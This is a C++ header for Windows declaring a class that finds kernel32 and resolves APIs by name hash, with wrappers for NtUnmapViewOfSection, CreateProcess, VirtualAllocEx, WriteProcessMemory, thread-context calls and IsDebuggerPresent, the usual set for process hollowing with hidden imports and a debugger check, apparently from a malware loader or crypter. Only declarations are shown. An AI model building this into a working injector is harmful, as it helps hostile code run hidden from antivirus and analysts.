#ifndef __DYANMIC_LOAD_H__
#define __DYANMIC_LOAD_H__

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

typedef unsigned int(__stdcall *FunPtr_LoadLibrary)(LPCSTR);
class DynamicLoad {
private:
    static void LoadLibraries();
    static unsigned int FindKernel32();
    static unsigned int __stdcall hashString(char* symbol);
    static unsigned int __stdcall findSymbolByHash(unsigned int dllBase, unsigned int symHash);
    static unsigned int getLibrary(char *libraryName);
public:
    static LONG fNtUnmapViewOfSection(HANDLE, PVOID);
    static BOOL fCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    static BOOL fCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    static LPVOID fVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    static LPVOID fVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    static BOOL fGetThreadContext(HANDLE hThread, LPCONTEXT lpContext);
    static BOOL fReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead);
    static BOOL fWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
    static BOOL fSetThreadContext(HANDLE hThread, CONTEXT *lpContext);
    static DWORD fResumeThread(HANDLE hThread);
    static BOOL fVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    static DWORD fGetModuleFileNameA(HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
    static DWORD fRtlZeroMemory(VOID* Dst, SIZE_T nSize);
    static VOID fExitProcess(UINT uExitCode);
    static BOOL fIsDebuggerPresent(VOID);
    static PVOID  fMalloc(SIZE_T nSize);
    static void fFree(void* MemBlock);
    static int DynamicLoad::fMessageBoxA(HWND h1, LPCSTR lp1, LPCSTR lp2, UINT u1);
};
#endif // __DYANMIC_LOAD_H__
